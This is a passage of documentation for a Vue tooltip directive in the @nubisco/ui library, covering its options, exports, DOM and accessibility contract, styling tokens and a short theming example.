**How the claims above are checked, and how far that goes.** Every bullet is pinned by a spec in `tests/tooltip.test.ts`: the attributes on the anchor and the chip, the reason reported for each dismissal, the description read at the instant `focusin` fires, the native `title` before and after. The stylesheet claims (the chip is reachable by the pointer, the description node is hidden without leaving the accessibility tree, the caret reads the offset the directive writes, no animation under `prefers-reduced-motion`) are checked against the CSS the real Sass compiler emits, not against a stylesheet a test invented.

What none of that can tell you is what a browser and a screen reader do with it, because those tests run in jsdom, which has no layout and no accessibility tree. So the geometry specs work against stubbed rects, and "`role="img"` plus `aria-label` yields a name" is a reading of the ARIA specification rather than an observation. If you are shipping this on a surface with a conformance obligation, test it with a real screen reader; the wiring is designed to be correct, and it is not machine-verified end to end.

</doc-tab>

<doc-tab name="Api">

## Directive

```vue
<element v-nb-tooltip="options" />
```

`options` is an `ITooltipOptions` object. A falsy value (`null`, `undefined`, `false`) hides any visible chip and disables the tooltip, which is the way to make one conditional.

**Every option is live.** Bind whatever you like to app state: content, `status`, `chipClass`, `position`, `followCursor`, `focusable`, `aria`. A change to any of them is applied to a chip that is already on screen (appearance included, not only text), and `focusable` adds or removes the opt-in tab stop as it flips. A permanent `aria-label` follows the content too, because an icon button whose tooltip went from "Mute" to "Unmute" has changed its name whether or not a chip is up.

**The directive is typed in templates.** `v-nb-tooltip` is declared in Vue's `GlobalDirectives` table, so `vue-tsc` checks the binding value in your own build and your editor completes the options. `v-nb-tooltip="{ position: 'nowhere' }"` is a type error, and so is passing a bare string. Every union in the table above is a real union in the source, including `status`: `status: 'chartreuse'` does not compile, where the old `flavor?: string` accepted it and emitted a chip with no styles at all.

## Options

| Option          | Type                                                                     | Default     | Description                                                                                                                 |
| --------------- | ------------------------------------------------------------------------ | ----------- | --------------------------------------------------------------------------------------------------------------------------- |
| `body`          | `string \| IComponentContent[]`                                          | none        | Main line. A string is text: eleven bare inline tags survive, attributes are never parsed, newlines become `<br>`.          |
| `header`        | `string \| IComponentContent[]`                                          | none        | Bold line above the body.                                                                                                   |
| `tip`           | `string \| IComponentContent[]`                                          | none        | Demoted line below the body, for a hint such as a shortcut.                                                                 |
| `aria`          | `'auto' \| 'label' \| 'description' \| 'none'`                           | `'auto'`    | How the text is wired to assistive technology. `auto` = `label` when the anchor has no accessible name, else `description`. |
| `position`      | `'cursor' \| 'top' \| 'bottom' \| 'left' \| 'right'`                     | `'cursor'`  | Preferred placement. Flipped and clamped to stay in the viewport. Focus and touch triggers use `top` when this is `cursor`. |
| `followCursor`  | `boolean`                                                                | `false`     | With `position: 'cursor'`, keeps the chip beside the moving pointer. Reactive.                                              |
| `delay`         | `number`                                                                 | `400`       | Hover-intent delay in ms. Ignored for focus and touch.                                                                      |
| `hideDelay`     | `number`                                                                 | `150`       | Ms the chip stays after the pointer or focus leaves.                                                                        |
| `animationTime` | `number`                                                                 | `300`       | Fade duration in ms. Ignored under `prefers-reduced-motion`.                                                                |
| `focusable`     | `boolean`                                                                | `false`     | Adds `tabindex="0"` to an anchor that cannot otherwise take focus. Never applied to an already-focusable element.           |
| `touch`         | `boolean`                                                                | `true`      | Open on tap. Set `false` where a tap means something else and the chip would be in the way.                                 |
| `overflowOnly`  | `boolean`                                                                | `false`     | Only open when the anchor's content is clipped (`scrollWidth` > box width).                                                 |
| `status`        | `'default' \| 'primary' \| 'info' \| 'success' \| 'warning' \| 'danger'` | `'default'` | Chip tone, from the same vocabulary as `NbBanner`. Reactive: a chip repaints while open.                                    |
| `chipClass`     | `string`                                                                 | none        | Extra class on the **chip**. The anchor's own `class` is untouched. Reactive.                                               |
| `open`          | `boolean`                                                                | none        | Controlled visibility. While it is a boolean, hover, focus and tap stop deciding and only report through `onOpenChange`.    |
| `defaultOpen`   | `boolean`                                                                | `false`     | Open once on mount, then behave normally. Uncontrolled.                                                                     |
| `onOpenChange`  | `(open: boolean, reason: TTooltipReason) => void`                        | none        | Every transition, with what caused it: `pointer`, `focus`, `touch`, `program`, `dismiss` or `superseded`.                   |
| `flavor`        | same union as `status`                                                   | none        | **Deprecated**, use `status`. Still works; `status` wins when both are set.                                                 |
| `classExtra`    | `string`                                                                 | none        | **Deprecated**, use `chipClass`. Still works; `chipClass` wins when both are set.                                           |

```ts
import type { ITooltipOptions } from '@nubisco/ui'
```

## Exports

| Export               | Type                                            | Description                                                                                                                             |
| -------------------- | ----------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| `dismissAllTooltips` | `() => void`                                    | Removes every visible chip immediately, controlled ones included, reporting `program`. For apps that change views without `vue-router`. |
| `nbTooltipDirective` | `(app: App) => void`                            | The installer, if you register directives yourself instead of using the library plugin.                                                 |
| `ITooltipOptions`    | interface                                       | The binding value type.                                                                                                                 |
| `TTooltipDirective`  | `ObjectDirective<HTMLElement, ITooltipOptions>` | The directive's own type, as declared in Vue's `GlobalDirectives`.                                                                      |
| `TTooltipAria`       | `'auto' \| 'label' \| 'description' \| 'none'`  | The `aria` option's type.                                                                                                               |
| `TTooltipStatus`     | union                                           | The `status` (and deprecated `flavor`) option's type.                                                                                   |
| `TTooltipTrigger`    | `'pointer' \| 'focus' \| 'touch' \| 'program'`  | What opened a chip.                                                                                                                     |
| `TTooltipReason`     | `TTooltipTrigger \| 'dismiss' \| 'superseded'`  | What a transition reported to `onOpenChange` was caused by. `superseded` is another anchor taking the one chip on screen.               |

All seven are named exports of `@nubisco/ui` (`src/main.ts`), so the import below compiles as written. There is no `export *` in that entry: a type that is not listed there does not exist for a consumer, whatever the source file exports.

## DOM contract

The chip is a `<span>` appended to `<body>`, positioned `fixed`:

```html
<span
  class="nb-tooltip nb-tooltip-top nb-tooltip-flavor-danger"
  aria-hidden="true"
>
  <div class="nb-tooltip-content">
    <div class="nb-tooltip-header">…</div>
    <div class="nb-tooltip-body">…</div>
    <div class="nb-tooltip-tip">…</div>
  </div>
</span>
```

The chip is `aria-hidden` in every mode and carries no `role` and no `id`. It is a painting of text that is already in the accessibility tree, and duplicating it there would announce the same words twice.

In description mode a second node is appended to `<body>`, once, when the anchor mounts, and removed when it unmounts. This is what `aria-describedby` points at:

```html
<span class="nb-tooltip-description" role="tooltip" id="nb-tooltip-4">
  Pushes this release to the live site
</span>
```

It is visually hidden with `clip-path`, never with `display: none` or the `hidden` attribute, both of which would take it out of the accessibility tree, which is the one place it exists to be. Its text is header, body and tip flattened to one sentence with the markup stripped: inline tags and `<br>` mean nothing to a screen reader.

The side suffix class (`nb-tooltip-top`) always reflects the placement actually used, and is stripped and rewritten on **every** placement, not only on the ones that changed side: it is what draws the caret, so a class that disagrees with the coordinates is a caret pointing away from the anchor. The tone class keeps the historical `nb-tooltip-flavor-` infix even though the option is now `status`, because renaming an option costs a consumer one word and renaming a class breaks every stylesheet that already targets a chip. The tone and `chipClass` classes are rewritten in place when their options change.

The chip is `pointer-events: auto` and `contain: layout`. The first is what makes it hoverable (WCAG 1.4.13); the second makes it the containing block for anything positioned inside it, so caller-supplied content cannot escape its box.

## Structure specification

Everything a redlined design would carry, as the values actually in `src/styles/directives/_tooltip.scss`. No literal is used anywhere in that file: every value below resolves through a token, which is why the chip is correct in both themes and in a white-labelled build.

| Property      | Value                                                                        | Note                                                                                    |
| ------------- | ---------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| Padding       | `--nb-base-unit`, as `padding-block` and `padding-inline`                    | One unit. A chip is a label, not a card.                                                |
| Corner radius | `calc(--nb-base-unit / 1.333)`                                               | Slightly tighter than the chip's padding, so the corner reads as square, not as a pill. |
| Max width     | `max-inline-size: --nb-tooltip-max-width`, default 34 units                  | About 55 characters. Beyond it the text wraps.                                          |
| Caret         | `--nb-base-unit` border triangle, plus a 1px outline triangle underneath     | Positioned along `--nb-tooltip-arrow-offset`, default 50%.                              |
| Gap to anchor | 4px (8px on the top and left sides, which measure from the far edge)         | Kept small: the caret has to bridge it.                                                 |
| Cursor offset | 14px from the pointer hotspot                                                | Wide enough that a hoverable chip cannot swallow the click meant for the anchor.        |
| Stacking      | `--nb-zindex-tooltip`                                                        | Above modal and toast, because a tooltip can label a control inside either.             |
| Entrance      | `tooltipAppear`, opacity 0 -> 1 and scale 0.96 -> 1, `animationTime` (300ms) | None at all under `prefers-reduced-motion: reduce`.                                     |
| Exit          | `tooltipDisappear`, 200ms                                                    | Skipped when the chip is removed immediately (unmount, route change).                   |

| Text part | Weight                      | Size                | Colour                         |
| --------- | --------------------------- | ------------------- | ------------------------------ |
| Header    | `--nb-font-weight-semibold` | `--nb-font-size-13` | chip foreground                |
| Body      | `--nb-font-weight-regular`  | `--nb-font-size-13` | chip foreground                |
| Tip       | `--nb-font-weight-regular`  | `--nb-font-size-13` | chip foreground at 78% opacity |

Leading is `--nb-line-height-snug` and alignment is `start`, not centre: a one-line chip shrink-wraps so the two look identical, and a wrapped chip is much easier to read ragged right.

The chip's own box is sized and padded with logical properties (`padding-inline`, `max-inline-size`, `text-align: start`), so a right-to-left build gets its padding and its measure on the sides the text actually runs along. The caret offsets stay physical, and that is not an oversight: which side a chip goes on is decided from geometry in the directive (which side has room in the viewport), and geometry has no writing direction. `--nb-tooltip-arrow-offset` is written in pixels from the chip's left edge for the same reason.

| `status`  | Background        | Foreground            |
| --------- | ----------------- | --------------------- |
| `default` | `--nb-c-contrast` | `--nb-c-surface`      |
| `primary` | `--nb-c-primary`  | `--nb-c-primary-a11y` |
| `info`    | `--nb-c-info`     | `--nb-c-info-a11y`    |
| `success` | `--nb-c-success`  | `--nb-c-success-a11y` |
| `warning` | `--nb-c-warning`  | `--nb-c-warning-a11y` |
| `danger`  | `--nb-c-danger`   | `--nb-c-danger-a11y`  |

The foreground is always the theme's computed `-a11y` companion for the background beside it, never a literal. The dark theme moves several of those ramps to a lighter step, so a hardcoded white would be correct in at most one theme and would be the worst available choice in the other.

## Tokens and custom properties

| Token / property                                                                     | Applied to                                                                                                                                                                                                                                                                                                                                                                            |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--nb-tooltip-bg`                                                                    | Chip background. Override per chip; defaults to `--nb-c-contrast`.                                                                                                                                                                                                                                                                                                                    |
| `--nb-tooltip-fg`                                                                    | Chip text. Override per chip; defaults to `--nb-c-surface`.                                                                                                                                                                                                                                                                                                                           |
| `--nb-c-primary`, `--nb-c-info`, `--nb-c-success`, `--nb-c-warning`, `--nb-c-danger` | `status` chip backgrounds.                                                                                                                                                                                                                                                                                                                                                            |
| the matching `-a11y` companions (`--nb-c-danger-a11y`, and so on)                    | `status` chip foregrounds. The theme's auto-contrast companion for each background, never a literal, and the same pairing `NbButton` uses for its solid variants, so a danger tooltip and a danger button never disagree. The dark theme moves `--nb-c-danger` and `--nb-c-info` to a lighter step of the same ramp, which is why a hardcoded white was correct in at most one theme. |
| `--nb-zindex-tooltip`                                                                | Stacking. Above modals and toasts, because a tooltip can label a control in either.                                                                                                                                                                                                                                                                                                   |
| `--nb-tooltip-max-width`                                                             | Wrap width. Defaults to 34 base units. Override per chip via `chipClass`.                                                                                                                                                                                                                                                                                                             |
| `--nb-base-unit`                                                                     | Padding, corner radius, arrow size and the default max width.                                                                                                                                                                                                                                                                                                                         |
| `--nb-line-height-snug`                                                              | Chip leading, so wrapped lines and `<br>` do not touch.                                                                                                                                                                                                                                                                                                                               |
| `--nb-font-size-13`, `--nb-font-weight-semibold`, `--nb-font-weight-regular`         | Chip typography.                                                                                                                                                                                                                                                                                                                                                                      |
| `--nb-tooltip-arrow-offset`                                                          | Written by the directive after a viewport clamp so the arrow keeps pointing at the anchor.                                                                                                                                                                                                                                                                                            |

```vue
<template>
  <!-- Retinting one chip without touching the theme -->
  <span
    class="build-status"
    v-nb-tooltip="{ body: 'Build queued', chipClass: 'tooltip-queued' }"
  >
    Queued
  </span>
</template>

<style lang="scss">
.tooltip-queued {
  --nb-tooltip-bg: var(--nb-c-info);
  // The companion token, not a literal: it is computed from the background
  // above, so it stays legible when the theme moves --nb-c-info.
  --nb-tooltip-fg: var(--nb-c-info-a11y);
}
</style>
```

</doc-tab>
